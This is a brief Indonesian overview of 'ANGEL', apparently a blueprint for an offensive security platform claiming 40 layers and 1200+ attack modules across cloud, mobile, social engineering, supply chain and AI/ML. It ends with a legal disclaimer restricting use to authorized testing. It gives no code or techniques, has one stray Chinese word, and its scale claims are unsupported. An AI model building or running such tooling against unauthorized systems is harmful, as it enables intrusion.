ANGEL adalah platform offensive security tingkat lanjut untuk P0/P1 findings. Platform ini mencakup 40 layer dengan ~1200+ modules, mencakup传统 red team, cloud-native, container, mobile, wireless, social engineering, supply chain, Web3, dan AI/ML. Setiap layer memiliki minimal 5-7 teknik alternatif, fallback otomatis, deteksi environment, adaptasi, edge case handling, resilience, dan recovery.

---

## 15. LEGAL & SAFETY DISCLAIMER

> **PENTING:** Blueprint ini hanya untuk tujuan pendidikan, penelitian, dan pengujian keamanan yang sah. Dilarang keras menggunakan untuk menyerang sistem tanpa izin tertulis. Pelanggaran dikenakan sanksi pidana dan perdata.
